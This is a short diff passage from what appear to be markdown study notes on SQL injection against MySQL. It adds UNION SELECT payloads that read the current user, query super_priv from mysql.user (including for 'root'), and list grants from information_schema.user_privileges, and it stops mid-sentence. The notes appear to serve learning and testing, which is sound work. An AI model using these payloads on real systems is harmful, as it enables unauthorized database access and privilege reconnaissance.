@@ -61,5 +61,8 @@ Injection payload will be : `value' UNION SELECT 1, user(), 3, 4-- -` or `value'
 
 ## User Privileges
 `SELECT super_priv FROM mysql.user` : This is the command used to know about the Super Admin Privileges.
+
 `value' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -` : This is the payload for the above command.
 If we want to know about the privileges of a particular user, maybe 'root', so we'll use the payload as : `value' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`
+
+`cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -` : This comm
